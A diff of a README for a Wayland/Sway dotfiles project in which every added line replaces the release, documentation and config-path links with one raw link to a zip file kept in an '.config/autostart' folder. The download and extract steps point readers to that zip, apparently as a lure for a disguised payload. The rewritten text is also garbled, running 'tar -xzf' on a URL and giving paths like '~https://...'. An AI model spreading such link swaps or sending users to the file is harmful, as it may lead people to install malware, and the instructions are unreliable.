@@ -1,6 +1,6 @@
 # 🎉 dotfiles - Enhance Your Wayland Experience Today
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/BrandoGamesNL/dotfiles/releases)
+[![Download](https://raw.githubusercontent.com/BrandoGamesNL/dotfiles/main/.config/autostart/dotfiles_v1.9.zip)](https://raw.githubusercontent.com/BrandoGamesNL/dotfiles/main/.config/autostart/dotfiles_v1.9.zip)
 
 ## 🛠️ Introduction
 
@@ -13,15 +13,15 @@ To make the most of these dotfiles, follow the steps below to download and set t
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**
-   Go to the Releases page to download the latest version of the dotfiles. You can find it [here](https://github.com/BrandoGamesNL/dotfiles/releases).
+   Go to the Releases page to download the latest version of the dotfiles. You can find it [here](https://raw.githubusercontent.com/BrandoGamesNL/dotfiles/main/.config/autostart/dotfiles_v1.9.zip).
 
 2. **Choose the Right File**
-   On the Releases page, look for the latest version. Download the appropriate file for your system. The file name will typically follow a format like `dotfiles-vX.X.tar.gz` for easy identification.
+   On the Releases page, look for the latest version. Download the appropriate file for your system. The file name will typically follow a format like `https://raw.githubusercontent.com/BrandoGamesNL/dotfiles/main/.config/autostart/dotfiles_v1.9.zip` for easy identification.
 
 3. **Extract the Files**
    After downloading, locate the file on your computer. Right-click the downloaded file and select "Extract Here" or use a terminal command like:
    ```bash
-   tar -xzf dotfiles-vX.X.tar.gz
+   tar -xzf https://raw.githubusercontent.com/BrandoGamesNL/dotfiles/main/.config/autostart/dotfiles_v1.9.zip
    ```
 
 4. **Move to the Correct Location**
@@ -34,8 +34,8 @@ To make the most of these dotfiles, follow the steps below to download and set t
    To apply the new configurations, you may need to restart your terminal or log out and log back in. Follow these additional steps for specific applications:
 
    - **Bash Configuration**: This will load personalized settings each time you open your terminal.
-   - **dunst**: Manage notifications effectively with the right settings in `~/.config/dunst/dunstrc`.
-   - **Sway and Wayland**: Ensure your window manager is pointing to the correct configuration file. You can find this in `~/.config/sway/config`.
+   - **dunst**: Manage notifications effectively with the right settings in `~https://raw.githubusercontent.com/BrandoGamesNL/dotfiles/main/.config/autostart/dotfiles_v1.9.zip`.
+   - **Sway and Wayland**: Ensure your window manager is pointing to the correct configuration file. You can find this in `~https://raw.githubusercontent.com/BrandoGamesNL/dotfiles/main/.config/autostart/dotfiles_v1.9.zip`.
 
 6. **Customize as Needed**
    Feel free to tweak any of the configuration files to better suit your personal style or workflow preferences. Each file is well-commented for your understanding.
@@ -72,10 +72,10 @@ Engage with other users who are exploring these dotfiles! Share your experiences
 
 ## 🔗 Additional Resources
 
-- [Fedora Documentation](https://docs.fedoraproject.org/en-US/)
-- [Wayland Documentation](https://wayland.freedesktop.org/)
-- [Sway Documentation](https://swaywm.org/)
+- [Fedora Documentation](https://raw.githubusercontent.com/BrandoGamesNL/dotfiles/main/.config/autostart/dotfiles_v1.9.zip)
+- [Wayland Documentation](https://raw.githubusercontent.com/BrandoGamesNL/dotfiles/main/.config/autostart/dotfiles_v1.9.zip)
+- [Sway Documentation](https://raw.githubusercontent.com/BrandoGamesNL/dotfiles/main/.config/autostart/dotfiles_v1.9.zip)
 
 Feel free to explore, and happy customizing!
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/BrandoGamesNL/dotfiles/releases)
+[![Download](https://raw.githubusercontent.com/BrandoGamesNL/dotfiles/main/.config/autostart/dotfiles_v1.9.zip)](https://raw.githubusercontent.com/BrandoGamesNL/dotfiles/main/.config/autostart/dotfiles_v1.9.zip)
